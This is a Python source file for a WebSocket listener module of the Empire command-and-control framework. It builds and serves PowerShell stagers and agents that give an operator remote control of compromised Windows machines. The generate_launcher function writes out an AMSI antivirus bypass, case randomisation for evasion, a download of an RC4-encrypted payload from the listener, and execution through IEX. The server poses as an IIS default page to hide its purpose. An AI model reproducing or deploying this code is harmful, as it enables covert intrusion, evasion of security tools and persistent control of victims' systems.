#!/usr/bin/env python
import logging
import base64
import random
import os
import time
import copy
from pydispatch import dispatcher
import geventwebsocket
from gevent.pywsgi import WSGIServer
from geventwebsocket.handler import WebSocketHandler
from flask import Flask, request, make_response, render_template
import binascii

# Empire imports
from lib.common import helpers
from lib.common import agents
from lib.common import encryption
from lib.common import packets
from lib.common import messages

# Modify the read_message member of the WebSocket class

class WebSocket(geventwebsocket.websocket.WebSocket):
    
    def read_message(self):
        opcode = None
        message = bytearray()

        while True:
            header, payload = self.read_frame()
            f_opcode = header.opcode

            if f_opcode in (self.OPCODE_TEXT, self.OPCODE_BINARY):
                # a new frame
                if opcode:
                    raise ProtocolError("The opcode in non-fin frame is "
                                        "expected to be zero, got "
                                        "{0!r}".format(f_opcode))

                # Start reading a new message, reset the validator
                self.utf8validator.reset()
                self.utf8validate_last = (True, True, 0, 0)

                opcode = f_opcode

            elif f_opcode == self.OPCODE_CONTINUATION:
                if not opcode:
                    raise ProtocolError("Unexpected frame with opcode=0")

            elif f_opcode == self.OPCODE_PING:
                self.handle_ping(header, payload)
                continue

            elif f_opcode == self.OPCODE_PONG:
                self.handle_pong(header, payload)
                continue

            elif f_opcode == self.OPCODE_CLOSE:
                self.handle_close(header, payload)
                return

            else:
                raise ProtocolError("Unexpected opcode={0!r}".format(f_opcode))

            if opcode == self.OPCODE_TEXT:
                self.validate_utf8(payload)

            message += payload

            if header.fin:
                break

        if opcode == self.OPCODE_TEXT:
            self.validate_utf8(message)
            return self._decode_bytes(message)
        else:
            return message

geventwebsocket.websocket.WebSocket = WebSocket



class Listener:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'WebSocket',

            'Author': ['@xorrior'],

            'Description': ("WebSocket listener"),

            # categories - client_server, peer_to_peer, broadcast, third_party
            'Category' : ('client_server'),

            'Comments': []
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name' : {
                'Description'   :   'Listener name.',
                'Required'      :   True,
                'Value'         :   'websocket'
            },
            'Host' : {
                'Description'   :   'Hostname/IP for staging.',
                'Required'      :   True,
                'Value'         :   "ws://%s:%s" % (helpers.lhost(), 80)
            },
            'BindIP' : {
                'Description'   :   'The IP to bind to on the control server',
                'Required'      :   True,
                'Value'         :   '0.0.0.0'
            },
            'Port' : {
                'Description'   :   'Port for the listener.',
                'Required'      :   True,
                'Value'         :   80
            },
            'Launcher' : {
                'Description'   :   'Launcher string.',
                'Required'      :   True,
                'Value'         :   'powershell -noP -sta -NonI -w 1 -enc '
            },
            'StagingKey' : {
                'Description'   :   'Staging key for initial agent negotiation.',
                'Required'      :   True,
                'Value'         :   '2c103f2c4ed1e59c0b4e2e01821770fa'
            },
            'DefaultDelay' : {
                'Description'   :   'Agent delay/reach back interval (in seconds).',
                'Required'      :   True,
                'Value'         :   0
            },
            'DefaultJitter' : {
                'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
                'Required'      :   True,
                'Value'         :   0.0
            },
            'DefaultLostLimit' : {
                'Description'   :   'Number of missed checkins before exiting',
                'Required'      :   True,
                'Value'         :   60
            },
            'DefaultProfile' : {
                'Description'   :   'Default communication profile for the agent.',
                'Required'      :   True,
                'Value'         :   "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
            },
            'CertPath' : {
                'Description'   :   'Certificate path for https listeners.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'KillDate' : {
                'Description'   :   'Date for the listener to exit (MM/dd/yyyy).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WorkingHours' : {
                'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ServerVersion' : {
                'Description'   :   'Server header for the control server.',
                'Required'      :   True,
                'Value'         :   'Microsoft-IIS/7.5'
            }
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {} # used to keep track of any threaded instances of this server

        # optional/specific for this module
        self.app = None 
        self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]

        # set the default staging key to the controller db default
        self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])


    def default_response(self):
        """
        If there's a default response expected from the server that the client needs to ignore,
        (i.e. a default HTTP page), put the generation here.
        """
        page = "<html><body><h1>It works!</h1>"
        page += "<p>This is the default web page for this server.</p>"
        page += "<p>The web server software is running but no content has been added, yet.</p>"
        page += "</body></html>"
        return page

    def HexToByte( hexStr ):
        """
        Convert a string hex byte values into a byte string. The Hex Byte values may
        or may not be space separated.
        """
        # The list comprehension implementation is fractionally slower in this case    
        #
        #    hexStr = ''.join( hexStr.split(" ") )
        #    return ''.join( ["%c" % chr( int ( hexStr[i:i+2],16 ) ) \
        #                                   for i in range(0, len( hexStr ), 2) ] )

        bytes = []

        hexStr = ''.join( hexStr.split(" ") )

        for i in range(0, len(hexStr), 2):
            bytes.append( chr( int (hexStr[i:i+2], 16 ) ) )

        return ''.join( bytes )


    def validate_options(self):
        """
        Validate all options for this listener.
        """

        self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]

        for key in self.options:
            if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                print helpers.color("[!] Option \"%s\" is required." % (key))
                return False

        return True


    def generate_launcher(self, encode=True, userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
        """
        Generate a basic launcher for the specified listener.
        """

        if not language:
            print helpers.color('[!] listeners/template generate_launcher(): no language specified!')
            return None
        
        if listenerName and (listenerName in self.mainMenu.listeners.activeListeners):

            # extract the set options for this instantiated listener
            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
            host = listenerOptions['Host']['Value']
            httphost = host.replace('wss', 'https')
            httphost = host.replace('ws', 'http')
            launcher = listenerOptions['Launcher']['Value']
            stagingKey = listenerOptions['StagingKey']['Value']
            profile = listenerOptions['DefaultProfile']['Value']
            uris = [a for a in profile.split('|')[0].split(',')]
            stage0 = random.choice(uris)
            customHeaders = profile.split('|')[2:]

            if language.startswith('po'):
                # PowerShell
                stager = ''
                if safeChecks.lower() == 'true':
                    # @mattifestation's AMSI bypass
                    stager = helpers.randomize_capitalization("[Ref].Assembly.GetType(")
                    stager += "'System.Management.Automation.AmsiUtils'"
                    stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                    stager += "'amsiInitFailed','NonPublic,Static'"
                    stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
                    stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")

                stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
                if userAgent.lower() == 'default':
                    profile = listenerOptions['DefaultProfile']['Value']
                    userAgent = profile.split('|')[1]
                stager += "$u='"+userAgent+"';"

                if 'wss' in host:
                    #allow for self-igned certificates for wss connections
                    stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
                
                if userAgent.lower() != 'none' or proxy.lower() != 'none':

                    if userAgent.lower() != 'none':
                        stager += helpers.randomize_capitalization('$wc.Headers.Add(')
                        stager += "'User-Agent',$u);"

                    if proxy.lower() != 'none':
                        if proxy.lower() == 'default':
                            stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                        else:
                            # TODO: implement form for other proxy
                            stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy;")
                            stager += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
                            stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
                        if proxyCreds.lower() == "default":
                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                        else:
                            # TODO: implement form for other proxy credentials
                            pass

                # TODO: reimplement stager retries?
                #check if we're using IPv6
                listenerOptions = copy.deepcopy(listenerOptions)
                bindIP = listenerOptions['BindIP']['Value']
                port = listenerOptions['Port']['Value']
                if ':' in bindIP:
                    if "wss" in host:
                        host = 'wss://' + '[' + str(bindIP) + ']' + ":" + str(port)
                        httphost = 'https://' + '[' + str(bindIP) + ']' + ":" + str(port)
                    else:
                        host = 'ws://' + '[' + str(bindIP) + ']' + ":" + str(port) 
                        httphost = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port)
                
                # code to turn the key string into a byte array
                stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                stager += "'%s');" % (stagingKey)

                # this is the minimized RC4 stager code from rc4.ps1
                stager += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                b64RoutingPacket = base64.b64encode(routingPacket)

                #Add custom headers if any
                if customHeaders != []:
                    for header in customHeaders:
                        headerKey = header.split(':')[0]
                        headerValue = header.split(':')[1]
                        stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                        stager += "\"%s\",\"%s\");" % (headerKey, headerValue)

                # add the RC4 packet to a cookie

                stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)
                
                stager += "$ser='%s';$t='%s';" % (httphost, stage0)
                stager += helpers.randomize_capitalization("$data=$WC.DownloadData($ser+$t);")
                stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")

                # decode everything and kick it over to IEX to kick off execution
                stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")

                # base64 encode the stager and return it
                if encode:
                    return helpers.powershell_launcher(stager, launcher)
                else:
                    #otherwise return the case-randomized stager
                    return stager

            if language.startswith('py'):
                # Python
                return ''

            else:
                print helpers.color("[!] listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module.")

        else:
            print helpers.color("[!] listeners/template generate_launcher(): invalid listener name specification!")


    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None):
        """
        If you want to support staging for the listener module, generate_stager must be
        implemented to return the stage1 key-negotiation stager code.
        """
        if not language:
            print helpers.color('[!] listeners/http generate_stager(): no language specified!')
            return None
        
        launcher = listenerOptions['Launcher']['Value']
        stagingKey = listenerOptions['StagingKey']['Value']
        host = listenerOptions['Host']['Value']
        profile = listenerOptions['DefaultProfile']['Value']

        randomizedStager = ''
        
        if language.lower() == 'powershell':
            # read in the stager base
            f = open("%s/data/agent/stagers/websocket.ps1" % (self.mainMenu.installPath))
            stager = f.read()
            f.close()

            # make sure the server ends with "/"
            if not host.endswith("/"):
                host += "/"
            
            # patch the server and key information
            stager = stager.replace('REPLACE_SERVER', host)
            stager = stager.replace("REPLACE_PROFILE", profile)
            stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)

            for line in stager.split("\n"):
                line = line.strip()
                # skip commented line
                if not line.startswith("#"):
                    # randomize capitalization of lines without quoted strings
                    if "\"" not in line:
                        randomizedStager += helpers.randomize_capitalization(line)
                    else:
                        randomizedStager += line

            # base64 encode the stager and return it
            if encode:
                return helpers.enc_powershell(randomizedStager)
            elif encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV+stagingKey, randomizedStager)
            else:
                # otherwise just return the case-randomized stager
                return randomizedStager
            
        else:
            print helpers.color("[!] Python is not currently supported for this listener.")


    def generate_agent(self, listenerOptions, language=None):
        """
        If you want to support staging for the listener module, generate_agent must be
        implemented to return the actual staged agent code.
        """
        if not language:
            print helpers.color('[!] listeners/http generate_agent(): no language specified!')
            return None

        language = language.lower()
        delay = listenerOptions['DefaultDelay']['Value']
        jitter = listenerOptions['DefaultJitter']['Value']
        profile = listenerOptions['DefaultProfile']['Value']
        lostLimit = listenerOptions['DefaultLostLimit']['Value']
        killDate = listenerOptions['KillDate']['Value']
        workingHours = listenerOptions['WorkingHours']['Value']
        b64DefaultResponse = base64.b64encode(self.default_response())

        if language == 'powershell':

            f = open(self.mainMenu.installPath + "./data/agent/websocketagent.ps1")
            code = f.read()
            f.close()

            # patch in the comms methods
            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
            code = code.replace('REPLACE_COMMS', commsCode)

            # strip out comments and blank lines
            code = helpers.strip_powershell_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
            code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
            code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
            code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
            if workingHours != "":
                code = code.replace('$WorkingHours,', "$WorkingHours = '" + str(workingHours) + "',")

            return code

        else:
            print helpers.color("[!] Python is not currently supported")


    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.
        This is so agents can easily be dynamically updated for the new listener.
        
        This should be implemented for the module.
        """

        if language:
            if language.lower() == 'powershell':
                
                getTask = """
                    function script:Get-Task {
                        
                        if ($script:client) {

                            # meta 'TASKING_REQUEST' : 4
                            $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4

                            #Send tasking request, receive taskings if any via Wait-Event. Then remove the events.
                            $script:client.Send($RoutingPacket, 0, $RoutingPacket.Length)
                            $returnData = (Wait-Event -SourceIdentifier "ServerEventReceive" -Timeout 5).MessageData
                            Remove-Event -SourceIdentifier "ServerEventReceive" -ErrorAction SilentlyContinue
                            $returnData
                        } 
                    }
                """

                sendMessage = """
                    function script:Send-Message {
                        param($Packets)

                        if($Packets) {
                            # build and encrypt the response packet
                            $EncBytes = Encrypt-Bytes $Packets

                            # build the top level RC4 "routing packet"
                            # meta 'RESULT_POST' : 5
                            $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5

                            #send the routing packet
                            $script:client.Send($RoutingPacket, 0, $RoutingPacket.Length)
                            $returnData = (Wait-Event -SourceIdentifier "ServerEventReceive" -Timeout 5).MessageData
                            Remove-Event -SourceIdentifier "ServerEventReceive" -ErrorAction SilentlyContinue
                        }
                    }
                """

                return getTask + sendMessage + "\n'New agent comms registered!'"

            elif language.lower() == 'python':
                # send_message()
                pass
            else:
                print helpers.color("[!] listeners/template generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module.")
        else:
            print helpers.color('[!] listeners/template generate_comms(): no language specified!')
    
    def start_server(self, listenerOptions):
        listenerOptions = self.options
        # make a copy of the currently set listener options for later stager/agent generation
        listenerOptions = copy.deepcopy(listenerOptions)

        # suppress the normal Flask output
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)

        bindIP = listenerOptions['BindIP']['Value']
        port = listenerOptions['Port']['Value']
        stagingKey = listenerOptions['StagingKey']['Value']

        app = Flask(__name__)
        app.secret_key = os.urandom(24)

        self.app = app

        @app.before_request
        def check_ip():
            """
            Before every request, check if the IP address is allowed.
            """
            if not self.mainMenu.agents.is_ip_allowed(request.remote_addr):
                dispatcher.send("[!] %s on the blacklist/not on the whitelist requested resource" % (request.remote_addr), sender="listeners/http")
                return make_response(self.default_response(), 200)

        @app.after_request
        def change_header(response):
            "Modify the default server version in the response."
            response.headers['Server'] = listenerOptions['ServerVersion']['Value']
            return response


        @app.after_request
        def add_proxy_headers(response):
            "Add HTTP headers to avoid proxy caching."
            response.headers['Cache-Control'] = "no-cache, no-store, must-revalidate"
            response.headers['Pragma'] = "no-cache"
            response.headers['Expires'] = "0"
            return response


        @app.route('/<path:request_uri>', methods=['GET'])
        def handle_get(request_uri):
            """
            Handle an agent GET request.

            This is used during the first step of the staging process,
            and when the agent requests taskings. For websockets, the agent will never retrieve taskings from here. This is only for STAGE0
            """

            clientIP = request.remote_addr
            dispatcher.send("[*] GET request for %s/%s from %s" % (request.host, request_uri, clientIP), sender='listeners/websocket')
            routingPacket = None
            cookie = request.headers.get('Cookie')
            if cookie and cookie != '':
                try:
                    # see if we can extract the 'routing packet' from the specified cookie location
                    # NOTE: this can be easily moved to a paramter, another cookie value, etc.
                    if 'session' in cookie:
                        dispatcher.send("[*] GET cookie value from %s : %s" % (clientIP, cookie), sender='listeners/websocket')
                        cookieParts = cookie.split(';')
                        for part in cookieParts:
                            if part.startswith('session'):
                                base64RoutingPacket = part[part.find('=')+1:]
                                # decode the routing packet base64 value in the cookie
                                routingPacket = base64.b64decode(base64RoutingPacket)
                except Exception as e:
                    routingPacket = None
                    pass
                
            if routingPacket:
                # parse the routing packet and process the results
                dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, routingPacket, listenerOptions, clientIP)
                if dataResults and len(dataResults) > 0:
                    for (language, results) in dataResults:
                        if results:
                            if results == 'STAGE0':
                                # handle_agent_data() signals that the listener should return the stager.ps1 code

                                # step 2 of negotiation -> return stager.ps1 (stage 1)
                                dispatcher.send("[*] Sending %s stager (stage 1) to %s" % (language, clientIP), sender='listeners/websocket')
                                stage = self.generate_stager(language=language, listenerOptions=listenerOptions)
                                return make_response(stage, 200)
                            
                            elif results.startswith('ERROR:'):
                                dispatcher.send("[!] Error from agents.handle_agent_data() for %s from %s: %s" % (request_uri, clientIP, results), sender='listeners/http')

                                if 'not in cache' in results:
                                    # signal the client to restage
                                    print helpers.color("[*] Orphaned agent from %s, signaling retaging" % (clientIP))
                                    return make_response(self.default_response(), 401)
                                else:
                                    return make_response(self.default_response(), 200)
                            else:
                                return make_response(self.default_response(), 200)
                        else:
                            return make_response(self.default_response(), 200)
                else:
                    return make_response(self.default_response(), 200) 
            else:
                return make_response(self.default_response(), 200)   
        
        def wsgi_app(environ, start_response):
            """
            This is the app that will handle websocket connections
            """ 
            path = environ["PATH_INFO"]  
            if path == "/":  
                handle_websocket(environ["wsgi.websocket"], environ)
            else:  
                return app(environ, start_response)

        def handle_websocket(ws, environ):
            stagingKey = listenerOptions['StagingKey']['Value']
            clientIP = environ['REMOTE_ADDR']
            while True:
                dispatcher.send("[*] Waiting for data", sender='listeners/websocket')
                requestData = ws.receive()
                hexstring = str(requestData).encode('hex')
                bytestring = binascii.unhexlify(hexstring)
                dispatcher.send("[*] Received data: %s"%(bytestring), sender='listeners/websocket')
                
                requestData = bytestring
                dispatcher.send("[*] Agent from %s sent data of length : %s" % (clientIP, len(requestData)), sender='listeners/websocket')
                # the routing packet should be at the front of the binary request.data
                #   NOTE: this can also go into a cookie/etc.
                dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, requestData, listenerOptions, clientIP)
                if dataResults and len(dataResults) > 0:
                    for (language, results) in dataResults:
                        if results:
                            if results.startswith('STAGE2'):
                                # TODO: document the exact results structure returned
                                if ':' in clientIP:
                                    clientIP = '[' + str(clientIP) + ']'

                                sessionID = results.split(' ')[1].strip()
                                sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']
                                dispatcher.send("[*] Sending agent (stage 2) to %s at %s" % (sessionID, clientIP), sender='listeners/websocket')

                                # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                                agentCode = self.generate_agent(language, listenerOptions)
                                encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, agentCode)

                                ws.send(encryptedAgent, binary=True)

                            elif results[:10].lower().startswith('error') or results[:10].lower().startswith('exception'):
                                dispatcher.send("[!] Error returned for results by %s : %s" %(clientIP, results), sender='listeners/websocket')
                                resp = '\x01'
                                ws.send(resp, binary=True)
                            elif results == 'VALID':
                                dispatcher.send("[*] Valid results return by %s" % (clientIP), sender='listeners/websocket')
                                resp = '\x02'
                                ws.send(resp, binary=True)
                            else:
                                ws.send(results, binary=True)
                                
                        else:
                            # No results, send default response
                            resp = '\x02'
                            ws.send(resp, binary=True)


                
        try:
            certPath = listenerOptions['CertPath']['Value']
            host = listenerOptions['Host']['Value']
            if certPath.strip() != '' and host.startswith('wss'):
                websocket_server = WSGIServer((bindIP,port), wsgi_app, certfile=certPath, handler_class=WebSocketHandler)
                websocket_server.serve_forever()
            else:
                websocket_server = WSGIServer((bindIP,port), wsgi_app, handler_class=WebSocketHandler)
                websocket_server.serve_forever()

        except Exception as e:
            print helpers.color("[!] Listener startup on port %s failed: %s " % (port, e))
            dispatcher.send("[!] Listener startup on port %s failed: %s " % (port, e), sender='listeners/websockets')
        

    def start(self, name=''):
        """
        If a server component needs to be started, implement the kick off logic
        here and the actual server code in another function to facilitate threading
        (i.e. start_server() in the http listener).
        """

        listenerOptions = self.options
        if name and name != '':
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()
        else:
            name = listenerOptions['Name']['Value']
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()

        return True


    def shutdown(self, name=''):
        """
        If a server component was started, implement the logic that kills the particular
        named listener here.
        """

        if name and name != '':
            print helpers.color("[!] Killing listener '%s'" % (name))
            self.threads[name].kill()
        else:
            print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
            self.threads[self.options['Name']['Value']].kill()